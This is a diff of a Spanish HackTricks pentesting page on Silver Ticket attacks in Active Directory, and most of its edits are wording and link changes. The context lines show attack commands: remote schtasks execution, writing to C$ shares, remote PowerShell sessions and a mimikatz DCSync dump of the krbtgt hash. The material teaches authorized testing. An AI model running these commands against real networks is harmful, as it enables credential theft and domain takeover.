@@ -9,20 +9,20 @@ Otras formas de apoyar a HackTricks:
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 
 <img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-Si estás interesado en una **carrera en hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).
+Si estás interesado en una **carrera de hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## Ticket de Plata
 
-El ataque de **Ticket de Plata** implica la explotación de tickets de servicio en entornos de Active Directory (AD). Este método se basa en **obtener el hash NTLM de una cuenta de servicio**, como una cuenta de computadora, para falsificar un ticket de concesión de servicio (TGS). Con este ticket falsificado, un atacante puede acceder a servicios específicos en la red, **haciéndose pasar por cualquier usuario**, generalmente apuntando a privilegios administrativos. Se enfatiza que el uso de claves AES para falsificar tickets es más seguro y menos detectable.
+El ataque de **Ticket de Plata** implica la explotación de tickets de servicio en entornos de Active Directory (AD). Este método se basa en **adquirir el hash NTLM de una cuenta de servicio**, como una cuenta de computadora, para falsificar un ticket de concesión de servicio (TGS). Con este ticket falsificado, un atacante puede acceder a servicios específicos en la red, **haciéndose pasar por cualquier usuario**, generalmente apuntando a privilegios administrativos. Se enfatiza que el uso de claves AES para falsificar tickets es más seguro y menos detectable.
 
 Para la creación de tickets, se emplean diferentes herramientas según el sistema operativo:
 
@@ -53,7 +53,7 @@ El servicio CIFS se destaca como un objetivo común para acceder al sistema de a
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependiendo del SO también:</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones también se puede solicitar: WINRM</p> |
-| Tareas Programadas                         | HOST                                                                       |
+| Tareas Programadas                        | HOST                                                                       |
 | Compartir Archivos de Windows, también psexec | CIFS                                                                       |
 | Operaciones LDAP, incluido DCSync          | LDAP                                                                       |
 | Herramientas de Administración Remota del Servidor de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
@@ -65,9 +65,9 @@ Usando **Rubeus** puedes **solicitar todos** estos tickets utilizando el paráme
 
 ### Eventos de Silver tickets
 
-* 4624: Inicio de sesión de cuenta
-* 4634: Cierre de sesión de cuenta
-* 4672: Inicio de sesión de administrador
+* 4624: Inicio de Sesión de Cuenta
+* 4634: Cierre de Sesión de Cuenta
+* 4672: Inicio de Sesión de Administrador
 
 ## Abusando de los tickets de Servicio
 
@@ -81,15 +81,9 @@ dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-También podrás obtener una shell dentro del host o ejecutar comandos arbitrarios utilizando **psexec**:
+### ANFITRIÓN
 
-{% content-ref url="../ntlm/psexec-and-winexec.md" %}
-[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
-{% endcontent-ref %}
-
-### HOST
-
-Con este permiso puedes generar tareas programadas en computadoras remotas y ejecutar comandos arbitrarios:
+Con este permiso, puedes generar tareas programadas en computadoras remotas y ejecutar comandos arbitrarios:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -121,13 +115,13 @@ Encuentra **más información sobre wmiexec** en la siguiente página:
 
 ### HOST + WSMAN (WINRM)
 
-Con acceso winrm a una computadora, puedes **acceder** e incluso obtener un PowerShell:
+Con acceso winrm a una computadora, puedes **acceder a ella** e incluso obtener un PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
 ### LDAP
 
-Con este privilegio, puedes volcar la base de datos del controlador de dominio utilizando **DCSync**:
+Con este privilegio, puedes volcar la base de datos del controlador de dominio utilizando **DCSync**.
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
@@ -143,7 +137,7 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere fluidez en polaco escrito y hablado_).
+Si estás interesado en una **carrera de hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere fluidez en polaco escrito y hablado_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -153,10 +147,10 @@ Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
